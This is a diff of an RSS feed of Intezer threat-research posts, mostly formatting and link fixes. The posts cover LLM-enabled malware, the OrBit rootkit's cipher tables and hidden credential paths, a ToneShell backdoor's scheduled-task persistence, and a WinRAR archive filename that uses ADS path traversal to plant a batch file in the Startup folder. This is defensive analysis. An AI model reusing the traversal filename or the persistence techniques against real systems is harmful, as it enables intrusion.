@@ -1735,31 +1735,31 @@ identified five malware families doing this.&lt;/p&gt;
 &lt;/thead&gt;
 &lt;tbody&gt;
 &lt;tr&gt;
-&lt;td&gt;MalTerminal&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://www.sentinelone.com/labs/prompts-as-code-embedded-keys-the-hunt-for-llm-enabled-malware/"target="_blank" rel="noopener"&gt;MalTerminal&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Reverse shell or ransomware generation&lt;/td&gt;
 &lt;td&gt;OpenAI GPT-4 (deprecated chat completions endpoint)&lt;/td&gt;
 &lt;td&gt;Hardcoded API key&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;LameHug/PROMPTSTEAL&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://www.splunk.com/en_us/blog/security/lamehug-ai-driven-malware-llm-cyber-intrusion-analysis.html"target="_blank" rel="noopener"&gt;LameHug/PROMPTSTEAL&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Reconnaissance and infostealer&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;Qwen 2.5-Coder-32B-Instruct&lt;/code&gt; via HuggingFace&lt;/td&gt;
 &lt;td&gt;Public HuggingFace Inference API (no embedded key observed)&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;Ransomware 3.0/PROMPTLOCK&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://arxiv.org/abs/2508.20444"target="_blank" rel="noopener"&gt;Ransomware 3.0&lt;/a&gt;/&lt;a href="https://www.welivesecurity.com/en/ransomware/first-known-ai-powered-ransomware-uncovered-eset-research/"target="_blank" rel="noopener"&gt;PROMPTLOCK&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Ransomware with exfiltration and wipe capability&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;gpt-oss-20b&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;Local Ollama API on the infected host&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;PROMPTFLUX&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools"target="_blank" rel="noopener"&gt;PROMPTFLUX&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;Dropper with AI-driven polymorphism&lt;/td&gt;
 &lt;td&gt;Google Gemini (&lt;code&gt;gemini-1.5-flash-latest&lt;/code&gt;)&lt;/td&gt;
 &lt;td&gt;Hardcoded API key&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;QUIETVAULT&lt;/td&gt;
+&lt;td&gt;&lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools"target="_blank" rel="noopener"&gt;QUIETVAULT&lt;/a&gt;&lt;/td&gt;
 &lt;td&gt;GitHub/NPM token stealer that uses AI to find additional secrets&lt;/td&gt;
 &lt;td&gt;Whatever AI CLI is installed on the victim (provider not named)&lt;/td&gt;
 &lt;td&gt;AI CLI tools already on the infected host&lt;/td&gt;
@@ -1800,6 +1800,11 @@ on the stolen-credential method, using an on-host AI session instead of just a
 key. PROMPTLOCK is different because it uses a local model and only works on
 one victim at a time, so it doesn&amp;rsquo;t fit into the four main routes and isn&amp;rsquo;t
 discussed further.&lt;/p&gt;
+&lt;p&gt;&lt;figure&gt;
+&lt;img src="https://research.intezer.com/blog/2026/06/how-attackers-access-llm-inference/images/fig1.png" title="AI-enabled malware families and the inference-access route each one uses." alt="" loading="lazy" /&gt;
+&lt;figcaption&gt;AI-enabled malware families and the inference-access route each one uses.&lt;/figcaption&gt;
+&lt;/figure&gt;&lt;/p&gt;
+&lt;p&gt;&lt;em&gt;Source: &lt;a href="https://cloud.google.com/blog/topics/threat-intelligence/threat-actor-usage-of-ai-tools"target="_blank" rel="noopener"&gt;Google Cloud threat intelligence&lt;/a&gt;&lt;/em&gt;&lt;/p&gt;
 &lt;h2&gt;Conclusion&lt;span class="hx:absolute hx:-mt-20" id="conclusion"&gt;&lt;/span&gt;
 &lt;a href="#conclusion" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;Across four routes: offensive LLMs for sale, free-tier and keyless public APIs,
 hardcoded keys in distributed artifacts, and exposed LLM servers on victim
@@ -1866,7 +1871,7 @@ pay for it.&lt;/p&gt;
 &lt;/div&gt;</description></item><item><title>OrBit (Re)turns: Tracking an Open-Source Linux Rootkit Across Four Years of Forks and Deployments</title><link>https://research.intezer.com/blog/2026/05/orbit-returns/</link><pubDate>Thu, 14 May 2026 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2026/05/orbit-returns/</guid><description>
 &lt;h2&gt;Introduction&lt;span class="hx:absolute hx:-mt-20" id="introduction"&gt;&lt;/span&gt;
 &lt;a href="#introduction" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h2&gt;&lt;p&gt;In July 2022, we
-&lt;a href="https://intezer.com/blog/orbit-new-undetected-linux-threat/"target="_blank" rel="noopener"&gt;published the first analysis&lt;/a&gt;
+&lt;a href="../../../2022/07/orbit-new-undetected-linux-threat/"&gt;published the first analysis&lt;/a&gt;
 of OrBit, a then-undocumented Linux userland-rootkit that stood out for its
 comprehensive libc hooking, SSH backdoor access, and PAM-based credential
 harvesting. At the time, OrBit appeared as a single sample with a single
@@ -1905,8 +1910,8 @@ to hide files, processes, and network connections from administrators and
 security tools alike. The malware stores its harvested credentials and
 configuration data in &lt;code&gt;/lib/libntpVnQE6mk/&lt;/code&gt;, a directory that remains invisible
 to standard enumeration thanks to the rootkit&amp;rsquo;s own hooks.&lt;/p&gt;
-&lt;h3&gt;July 2002&lt;span class="hx:absolute hx:-mt-20" id="july-2002"&gt;&lt;/span&gt;
-&lt;a href="#july-2002" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;table&gt;
+&lt;h3&gt;July 2022&lt;span class="hx:absolute hx:-mt-20" id="july-2022"&gt;&lt;/span&gt;
+&lt;a href="#july-2022" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;table&gt;
 &lt;thead&gt;
 &lt;tr&gt;
 &lt;th&gt;Hash&lt;/th&gt;
@@ -2097,6 +2102,7 @@ data-copied-label="Copied!"
 &lt;/button&gt;
 &lt;/div&gt;
 &lt;/div&gt;
+&lt;p&gt;&lt;em&gt;The exported xread function in sample 296d28eb.&lt;/em&gt;&lt;/p&gt;
 &lt;h4&gt;3ba6c174 / 4203271c: Lineage B lite build&lt;span class="hx:absolute hx:-mt-20" id="3ba6c174--4203271c-lineage-b-lite-build"&gt;&lt;/span&gt;
 &lt;a href="#3ba6c174--4203271c-lineage-b-lite-build" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h4&gt;&lt;p&gt;Both files, 3ba6c174 and 4203271c, represent the first appearance of Lineage B,
 a deliberately lite fork of the OrBit rootkit. Both are dynamically linked
@@ -2399,7 +2405,7 @@ using two lookup tables at &lt;code&gt;.data&lt;/code&gt; offsets for the cipher
 different scheme from the XOR encryption used by the previous rootkit payloads.&lt;/p&gt;
 &lt;div class="hextra-code-block hx:relative hx:mt-6 hx:first:mt-0 hx:group/code"&gt;
 &lt;div&gt;&lt;div class="highlight"&gt;&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-c++" data-lang="c++"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;mw_plain_table&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x4e&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;0123456789abcdefghijklmnopqrstuvzywxABCDEFGHIJKLMNOPQRSTUVZYWX|:. !#-/;&amp;amp;*&lt;/span&gt;&lt;span class="se"&gt;\&amp;#39;\&amp;#34;\n\r&lt;/span&gt;&lt;span class="s"&gt;&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;
-&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;mw_cipher_table&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x58&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;&amp;lt;&amp;gt;@o$:,.l+*^?=)(|AB&amp;amp;%;D!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;&lt;span class="kt"&gt;char&lt;/span&gt; &lt;span class="n"&gt;mw_cipher_table&lt;/span&gt;&lt;span class="p"&gt;[&lt;/span&gt;&lt;span class="mh"&gt;0x58&lt;/span&gt;&lt;span class="p"&gt;]&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;#34;&amp;lt;&amp;gt;@o$:,.l+*^?=)(|AB&amp;amp;%;D{!wkUxzvutsrqp_nm-ihgfFCcba~K23456789eyd1XSNQWTZMIRHGVOYLjPJE/][&amp;#34;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;&lt;div class="hextra-code-copy-btn-container hx:opacity-0 hx:transition hx:group-hover/code:opacity-100 hx:flex hx:gap-1 hx:absolute hx:m-[11px] hx:right-0 hx:top-0"&gt;
 &lt;button
 class="hextra-code-copy-btn hx:group/copybtn hx:cursor-pointer hx:transition-all hx:active:opacity-50 hx:bg-primary-700/5 hx:border hx:border-black/5 hx:text-gray-600 hx:hover:text-gray-900 hx:rounded-md hx:p-1.5 hx:dark:bg-primary-300/10 hx:dark:border-white/10 hx:dark:text-gray-400 hx:dark:hover:text-gray-50"
 title="Copy code"
@@ -2467,7 +2473,7 @@ However, it is worth noting that this connection exists.&lt;/p&gt;
 &lt;td&gt;54&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
-&lt;td&gt;&lt;code&gt;2b2eeb22&lt;/code&gt;&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;d7b487d2&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;0xA2&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;/lib/libseconf/&lt;/code&gt;&lt;/td&gt;
 &lt;td&gt;&lt;code&gt;57ill4Cu63&lt;/code&gt;&lt;/td&gt;
@@ -2913,7 +2919,7 @@ multiple unrelated actor groups.&lt;/p&gt;
 &lt;div class="hx:w-full hx:min-w-0 hx:leading-7"&gt;
 &lt;div class="hx:mt-6 hx:leading-7 hx:first:mt-0"&gt;&lt;p&gt;Learn more about &lt;a href="https://intezer.com/?utm=research"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>Tracing a Paper Werewolf Campaign Through Ai Generated Decoys and Excel Xlls</title><link>https://research.intezer.com/blog/2025/12/tracing-a-paper-werewolf-campaign-through-ai-generated-decoys-and-excel-xlls/</link><pubDate>Fri, 19 Dec 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/12/tracing-a-paper-werewolf-campaign-through-ai-generated-decoys-and-excel-xlls/</guid><description>
+&lt;/div&gt;</description></item><item><title>Tracing a Paper Werewolf campaign through AI-generated decoys and Excel XLLs</title><link>https://research.intezer.com/blog/2025/12/tracing-a-paper-werewolf-campaign-through-ai-generated-decoys-and-excel-xlls/</link><pubDate>Fri, 19 Dec 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/12/tracing-a-paper-werewolf-campaign-through-ai-generated-decoys-and-excel-xlls/</guid><description>
 &lt;p&gt;An XLL is a native Windows DLL that Excel loads as an add-in, allowing it to
 execute arbitrary code through exported functions like xlAutoOpen. Since at
 least mid-2017, threat actors began abusing Microsoft Excel add-ins via the
@@ -3120,7 +3126,7 @@ vulnerability in WinRAR that involves the abuse of NTFS alternate data streams
 malicious content within seemingly harmless filenames by appending ADSes that
 include relative path traversal sequences.&lt;/p&gt;
 &lt;p&gt;The archive contains a file named
-Вх.письмо_Мипромторг.lnk:..&lt;em&gt;..&lt;/em&gt;..&lt;em&gt;..&lt;/em&gt;.._Roaming_Microsoft_Windows_run.bat&lt;/p&gt;
+&lt;code&gt;Вх.письмо_Мипромторг.lnk:.._.._.._.._.._Roaming_Microsoft_Windows_run.bat&lt;/code&gt;&lt;/p&gt;
 &lt;p&gt;When the archive is opened, WinRAR fails to properly sanitize these ADS paths
 and extracts the hidden data streams, placing them in unintended or sensitive
 locations such as %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup.&lt;/p&gt;
@@ -3245,7 +3251,7 @@ indicating that their tradecraft is still developing.&lt;/p&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;dc2df351c306a314569b1eeaccf5046ce5a64df487fa51c907cb065e968bba80&lt;/td&gt;
-&lt;td&gt;Вх.письмо_Мипромторг.lnk:..&lt;em&gt;..&lt;/em&gt;..&lt;em&gt;..&lt;/em&gt;.._Roaming_Microsoft_Windows_run.bat&lt;/td&gt;
+&lt;td&gt;&lt;code&gt;Вх.письмо_Мипромторг.lnk:.._.._.._.._.._Roaming_Microsoft_Windows_run.bat&lt;/code&gt;&lt;/td&gt;
 &lt;/tr&gt;
 &lt;tr&gt;
 &lt;td&gt;76e4d344b3ec52d3f1a81de235022ad2b983eb868b001b93e56deee54ae593c5&lt;/td&gt;
@@ -3266,7 +3272,7 @@ indicating that their tradecraft is still developing.&lt;/p&gt;
 &lt;div class="hx:w-full hx:min-w-0 hx:leading-7"&gt;
 &lt;div class="hx:mt-6 hx:leading-7 hx:first:mt-0"&gt;&lt;p&gt;Learn more about &lt;a href="https://intezer.com/?utm=research"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>Frankenstein Variant of the Toneshell Backdoor Targeting Myanmar</title><link>https://research.intezer.com/blog/2025/09/frankenstein-variant-of-the-toneshell-backdoor-targeting-myanmar/</link><pubDate>Wed, 10 Sep 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/09/frankenstein-variant-of-the-toneshell-backdoor-targeting-myanmar/</guid><description>
+&lt;/div&gt;</description></item><item><title>Frankenstein Variant of the ToneShell Backdoor Targeting Myanmar</title><link>https://research.intezer.com/blog/2025/09/frankenstein-variant-of-the-toneshell-backdoor-targeting-myanmar/</link><pubDate>Wed, 10 Sep 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/09/frankenstein-variant-of-the-toneshell-backdoor-targeting-myanmar/</guid><description>
 &lt;p&gt;ToneShell is a lightweight backdoor tied to the China-nexus group Mustang
 Panda. Typically delivered via DLL sideloading inside compressed archives with
 legitimate signed executables and often spread through cloud-hosted lures.
@@ -3299,12 +3305,12 @@ other revolutionary forces.&lt;/p&gt;
 &lt;figcaption&gt;Code reuse with ToneShell&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;The backdoor first checks the current module path for the string
-&lt;code&gt;Google\\DriveFS\\Scratch&lt;/code&gt;. If not found, it enumerates processes to identify
+&lt;code&gt;Google\DriveFS\Scratch&lt;/code&gt;. If not found, it enumerates processes to identify
 the parent process, retrieves its image path, and verifies whether it contains
 &lt;strong&gt;GoogleDrive&lt;/strong&gt;. If found, the backdoor will terminate its execution. This
 check might be an attempt by the threat actor to prevent infecting themselves.
 If this validation fails, the code enforces a single-instance policy using a
-named mutex, &lt;code&gt;Global\\SingleCorporation12AD8B&lt;/code&gt;. It attempts to create the
+named mutex, &lt;code&gt;Global\SingleCorporation12AD8B&lt;/code&gt;. It attempts to create the
 mutex, storing the handle globally and setting a flag to indicate success or
 failure. If creation fails or the mutex already exists, it releases any handles
 and marks it as not created. Next, the backdoor checks its persistence
@@ -3312,17 +3318,17 @@ location. It compares its module path with the user profile directory
 (CSIDL_APPDATA, 0x1A). If the binary is not under the user profile, it copies
 itself and the following files: msvcr100.dll, msvcp100.dll, mfc100.dll to a new
 folder it creates. The new directory name consists of a 6-character random
-uppercase folder name (e.g., &lt;code&gt;C:\\Users\&amp;lt;user&amp;gt;\\AppData\&amp;lt;random-6-chars&amp;gt;&lt;/code&gt;).&lt;/p&gt;
+uppercase folder name (e.g., &lt;code&gt;C:\Users\&amp;lt;user&amp;gt;\AppData\&amp;lt;random-6-chars&amp;gt;&lt;/code&gt;).&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
 &lt;img src="https://research.intezer.com/blog/2025/09/frankenstein-variant-of-the-toneshell-backdoor-targeting-myanmar/images/fig2.png" title="The function that copies the DLLs to a new folder in AppData" alt="" loading="lazy" /&gt;
 &lt;figcaption&gt;The function that copies the DLLs to a new folder in AppData&lt;/figcaption&gt;
 &lt;/figure&gt;&lt;/p&gt;
 &lt;p&gt;Once installed, it attempts to spin up the Task Scheduler COM service, connect
-to the local scheduler, open the root folder (&amp;quot;\&amp;quot;) and obtain an
+to the local scheduler, open the root folder (&lt;code&gt;&amp;quot;\&amp;quot;&lt;/code&gt;) and obtain an
 IRegisteredTask for a task named dokanctl. If the task doesn’t exist, it will
 create it using RegisterTaskDefinition. The task is set to execute every
 minute, it sets the execution path to the folder in AppData created earlier:
-&lt;code&gt;%APPDATA%\&amp;lt;random-6-chars&amp;gt;\\svchosts.exe&lt;/code&gt;, and sets it as the action Path. The
+&lt;code&gt;%APPDATA%\&amp;lt;random-6-chars&amp;gt;\svchosts.exe&lt;/code&gt;, and sets it as the action Path. The
 task is registered in the root folder with the name &lt;code&gt;dokanctl&lt;/code&gt;.&lt;/p&gt;
 &lt;p&gt;&lt;figure&gt;
 &lt;img src="https://research.intezer.com/blog/2025/09/frankenstein-variant-of-the-toneshell-backdoor-targeting-myanmar/images/fig3.png" title="Task creation" alt="" loading="lazy" /&gt;
@@ -3400,7 +3406,7 @@ sandboxing systems that expect short-lived, straightforward malware runs.&lt;/p&
 &lt;h3&gt;GUID Creation&lt;span class="hx:absolute hx:-mt-20" id="guid-creation"&gt;&lt;/span&gt;
 &lt;a href="#guid-creation" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;Similar to earlier versions, this variant of ToneShell generates a unique
 identifier for each infected machine. It first attempts to check if one was
-already created by reading 16 bytes from C:\ProgramData\SystemRuntimeLag.inc.
+already created by reading 16 bytes from &lt;code&gt;C:\ProgramData\SystemRuntimeLag.inc&lt;/code&gt;.
 The malware creates a new seed if the file is missing, unreadable, or does not
 provide exactly 16 bytes. The primary method is to generate a GUID via
 CoCreateGuid and use it as the seed. If that fails, it falls back to producing
@@ -3463,7 +3469,7 @@ ongoing research and threat hunting to counter cyber operations.&lt;/p&gt;
 &lt;div class="hx:w-full hx:min-w-0 hx:leading-7"&gt;
 &lt;div class="hx:mt-6 hx:leading-7 hx:first:mt-0"&gt;&lt;p&gt;Learn more about &lt;a href="https://intezer.com/?utm=research"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>Fire in the Woods – A New Variant of FireWood</title><link>https://research.intezer.com/blog/2025/08/threat-bulletin-firewood/</link><pubDate>Wed, 13 Aug 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/08/threat-bulletin-firewood/</guid><description>
+&lt;/div&gt;</description></item><item><title>Threat Bulletin: Fire in the Woods – A New Variant of FireWood</title><link>https://research.intezer.com/blog/2025/08/threat-bulletin-firewood/</link><pubDate>Wed, 13 Aug 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/08/threat-bulletin-firewood/</guid><description>
 &lt;p&gt;&lt;em&gt;A new and low-detected variant of the FireWood backdoor was discovered by
 Intezer’s Research Team, with some changes in the implementation and the
 configuration of the backdoor.&lt;/em&gt;&lt;/p&gt;
@@ -3607,7 +3613,7 @@ its code is identical to the one we analyzed:&lt;/p&gt;
 &lt;div class="hx:w-full hx:min-w-0 hx:leading-7"&gt;
 &lt;div class="hx:mt-6 hx:leading-7 hx:first:mt-0"&gt;&lt;p&gt;Learn more about &lt;a href="https://intezer.com/?utm=research"target="_blank" rel="noopener"&gt;Intezer&lt;/a&gt;&lt;/p&gt;&lt;/div&gt;
 &lt;/div&gt;
-&lt;/div&gt;</description></item><item><title>Emerging Phishing Techniques New Threats and Attack Vectors</title><link>https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/</link><pubDate>Wed, 23 Apr 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/</guid><description>
+&lt;/div&gt;</description></item><item><title>Emerging Phishing Techniques: New Threats and Attack Vectors</title><link>https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/</link><pubDate>Wed, 23 Apr 2025 00:00:00 +0000</pubDate><guid>https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/</guid><description>
 &lt;p&gt;Phishing remains
 &lt;a href="https://www.crowdstrike.com/en-us/cybersecurity-101/cyberattacks/common-cyberattacks/"target="_blank" rel="noopener"&gt;one of the most prevalent&lt;/a&gt;
 and successful attack vectors used by cybercriminals today. It exploits human
@@ -3677,7 +3683,8 @@ credential-harvesting page.&lt;/li&gt;
 &lt;p&gt;This multi-layered obfuscation allowed the payload to bypass most static
 analysis engines.&lt;/p&gt;
 &lt;p&gt;For this analysis, the Intezer research team developed a custom tool to analyze
-this technique in SVG files.&lt;/p&gt;
+this technique in SVG files:&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig4.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;Findings&lt;span class="hx:absolute hx:-mt-20" id="findings"&gt;&lt;/span&gt;
 &lt;a href="#findings" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;When using the tool, we found that:&lt;/p&gt;
 &lt;ul&gt;
@@ -3699,9 +3706,10 @@ metadata, allowing them to bypass email security tools and remain undetected by
 most scanning solutions. The phishing emails delivering these PDFs successfully
 passed through multiple email security filters, reaching users’ inboxes without
 any warnings.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig5.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;How the PDF Format Works&lt;span class="hx:absolute hx:-mt-20" id="how-the-pdf-format-works"&gt;&lt;/span&gt;
-&lt;a href="#how-the-pdf-format-works" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The PDF format is built on a [structured and modular
-architecture],(&lt;a href="https://intezer.com/blog/incident-response/analyze-malicious-pdf-files/"target="_blank" rel="noopener"&gt;https://intezer.com/blog/incident-response/analyze-malicious-pdf-files/&lt;/a&gt;)
+&lt;a href="#how-the-pdf-format-works" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;The PDF format is built on a &lt;a href="https://intezer.com/blog/incident-response/analyze-malicious-pdf-files/"target="_blank" rel="noopener"&gt;structured and modular
+architecture&lt;/a&gt;,
 making it flexible for both rendering content and embedding interactive
 features. Each PDF file consists of a collection of objects, including text,
 images, fonts, scripts, annotations, and more organized in a hierarchical
@@ -3761,7 +3769,7 @@ automated tools not designed to extract URLs from non-standard locations in a
 PDF.&lt;/p&gt;
 &lt;h3&gt;Analysis&lt;span class="hx:absolute hx:-mt-20" id="analysis-1"&gt;&lt;/span&gt;
 &lt;a href="#analysis-1" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;IOC: 252422de154885806f491d602af3bb2eda10563308c65fa5ba8272a9b59f7f41
-(VirusTotal)&lt;/p&gt;
+(&lt;a href="https://www.virustotal.com/gui/file/252422de154885806f491d602af3bb2eda10563308c65fa5ba8272a9b59f7f41"target="_blank" rel="noopener"&gt;VirusTotal&lt;/a&gt;)&lt;/p&gt;
 &lt;p&gt;Upon analyzing the malicious PDF file, we discovered that:&lt;/p&gt;
 &lt;ul&gt;
 &lt;li&gt;The phishing URL was stored inside an annotation object within the /Annots
@@ -3774,8 +3782,8 @@ to be delivered directly to users.&lt;/li&gt;
 security vendor flagged it as malicious, and the malicious PDF bypassed
 security vendors and went straight to the victim’s mailbox.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig4.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig5.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig6.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig7.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;p&gt;To extract the hidden URL, we performed the following steps using a custom PDF
 URL analyzer built by the Intezer research team:&lt;/p&gt;
 &lt;ul&gt;
@@ -3787,8 +3795,9 @@ objects that contained hyperlinks.&lt;/li&gt;
 malicious indicators and phishing databases using a custom tool we built and
 Intezer’s platform.&lt;/li&gt;
 &lt;/ul&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig6.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig7.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig8.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig9.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig10.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;Findings&lt;span class="hx:absolute hx:-mt-20" id="findings-1"&gt;&lt;/span&gt;
 &lt;a href="#findings-1" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;In the analysis we conducted, we found that:&lt;/p&gt;
 &lt;ul&gt;
@@ -3813,6 +3822,7 @@ host phishing content, making detection more challenging. Instead of directly
 sending a phishing URL, attackers share a read-only OneDrive link that appears
 benign but contains an embedded malicious URL that executes dynamically within
 JavaScript when loaded.&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig11.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
 &lt;h3&gt;Why This Attack is Difficult to Detect&lt;span class="hx:absolute hx:-mt-20" id="why-this-attack-is-difficult-to-detect"&gt;&lt;/span&gt;
 &lt;a href="#why-this-attack-is-difficult-to-detect" class="subheading-anchor" aria-label="Permalink for this section"&gt;&lt;/a&gt;&lt;/h3&gt;&lt;p&gt;This attack is challenging to detect due to how OneDrive renders shared
 documents:&lt;/p&gt;
@@ -3875,7 +3885,7 @@ documents (e.g., &lt;code&gt;.docx&lt;/code&gt;) to deliver phishing payloads. M
 archive web content and can store complete HTML documents, including images,
 links, and scripts. This makes them ideal for hiding phishing lures inside
 seemingly harmless Office files.&lt;/p&gt;
-&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig8.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
+&lt;p&gt;&lt;img src="https://research.intezer.com/blog/2025/04/emerging-phishing-techniques-new-threats-and-attack-vectors/images/fig12.png" alt="" loading="lazy" /&gt;&lt;/p&gt;
